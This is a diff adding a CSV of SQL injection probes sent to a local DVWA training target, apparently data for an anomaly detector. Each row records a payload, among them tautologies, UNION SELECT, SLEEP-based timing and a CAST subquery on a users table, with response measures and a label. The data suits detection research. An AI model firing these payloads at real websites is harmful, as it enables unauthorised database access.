@@ -1,0 +1,13 @@
+url,param,payload,resp_len,len_diff,sql_error_flag,resp_time,anomaly_score,label
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,' OR '1'='1,295,0,0,0.0556013584136962,0.1059360423987819,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,' OR '1'='1' --,295,0,0,0.0305731296539306,-0.0866749437808215,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,' UNION SELECT NULL --,295,0,0,0.0168139934539794,-0.0989586838695264,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,' OR '1'='1' --,295,0,0,0.0072219371795654,-0.1243811396345629,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,' OR '1'='1,295,0,0,0.0239725112915039,-0.1544653854881387,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,' AND SLEEP(3) --,295,0,0,0.0259690284729003,-0.1634386532355539,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT) --,295,0,0,0.0045735836029052,-0.2186487145497794,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,' UNION SELECT NULL --,295,0,0,0.0030128955841064,-0.2235350272746921,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT) --,295,0,0,0.0030379295349121,-0.2281444074555734,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,""" OR ""a""=""a",295,0,0,0.00398850440979,-0.2600688461707296,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,""" OR ""a""=""a",295,0,0,0.0037946701049804,-0.2696661074042296,1
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,' AND SLEEP(3) --,295,0,0,0.0038228034973144,-0.2717959641860743,1
